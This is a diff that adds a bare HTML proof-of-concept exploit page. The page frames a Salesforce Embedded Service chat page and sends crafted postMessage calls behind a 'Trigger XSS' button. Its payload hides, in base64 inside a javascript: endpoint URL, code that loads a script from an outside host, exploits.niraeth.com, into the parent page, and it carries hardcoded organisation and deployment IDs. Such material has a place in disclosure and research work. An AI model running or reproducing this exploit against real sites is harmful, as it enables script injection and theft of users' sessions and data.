@@ -1,0 +1,75 @@
+
+
+		<!--
+				-->
+
+
+
+<html>
+	<head></head>
+	<body>
+	<pre>This iframe will load  site/embeddedservice/5.0/esw.html</pre>
+	<iframe id="vulnframe" src=""></iframe>
+<br/>
+<p>1. Select a URL to open:</p>
+<select id="open_url">
+</select>
+<input type='button' onclick='open_window();' value='open frame'/>
+		
+<br/><br/>
+
+2. Click <input id="script_load_btn" type='button' onclick='script_load();' value='Trigger XSS' disabled/> <br/>
+
+
+<script>
+	function open_window() {
+		var url = document.getElementById("open_url").value;
+		document.getElementById("vulnframe").src = url + "?parent=https://esw1234.github.io";
+	}
+	var add_urls = [
+		"https://bdrasin:wsl1:6101/embeddedservice/5.0/esw.html",
+		"https://bdrasin:wsl1:6101/embeddedservice/5.0/esw.html",
+	];
+	
+	console.log("add_urls.length = " + add_urls.length);
+	
+	for(var i=0;i < add_urls.length;i ++) {
+		var add_url = add_urls[i];
+		var select = document.getElementById("open_url");
+		var option = document.createElement("option");
+		option.value = add_url;
+		option.innerText = add_url;
+		if( i === add_urls.length - 1 )
+			option.selected = true;
+			
+		select.appendChild(option);		
+	}	
+		
+
+	window.addEventListener("message", function(e) {
+		console.log(e.data);		
+		if( typeof e.data === 'object' && e.data.method === 'session.frameReady' ) {
+			document.getElementById("script_load_btn").removeAttribute("disabled");
+		}
+	});
+	var domain = "exploits.niraeth.com";
+	var target = window.frames[0];
+	function script_load() {
+		target.postMessage({method: "script.load", domain: domain, data:"Chasitor" }, '*');
+		setTimeout(chasitor_load, 3000); // 
+	}
+	
+	function chasitor_load() {
+		target.postMessage({method: "chasitor.load", domain: domain, data:{settingsObj:{visitorInfo:{originalReferrer:"", pages:[]}, orgId:"00D30000000XsfG", deploymentId: "5723y000000k9p2", buttonId:"5733y000000blX3", chasitorSrc: "https://cb.la1-c2-ukb.salesforceliveagent.com/content/g/js/54.0/chasitor.js",  endpointURL:"https://la3-c2-cdg.salesforceliveagent.com/chat/rest/cdm?version=54&redirect=true#"} } }, '*');
+		
+		var intv = setInterval(function() {
+			target.postMessage({method: "chasitor.load", domain: domain, data:{settingsObj:{visitorInfo:{originalReferrer:"", pages:[]}, orgId:"00D30000000XsfG", deploymentId: "5723y000000k9p2", buttonId:"5733y000000blX3", chasitorSrc: "https://cb.la1-c2-ukb.salesforceliveagent.com/content/g/js/54.0/chasitor.js", endpointURL:"javascript:eval(atob('dmFyIHNjciA9IHBhcmVudC5kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsgc2NyLnNyYz0iaHR0cHM6Ly9leHBsb2l0cy5uaXJhZXRoLmNvbS9zY3JpcHRzL3NmeHNzLmpzPyIrbmV3IERhdGUoKS5nZXRUaW1lKCk7IHBhcmVudC5kb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcik7'))//"} } }, '*');
+		}, 10);
+		
+		setTimeout(function() {
+			clearInterval(intv);
+		}, 4000);
+	}
+</script>
+	</body>
+</html>
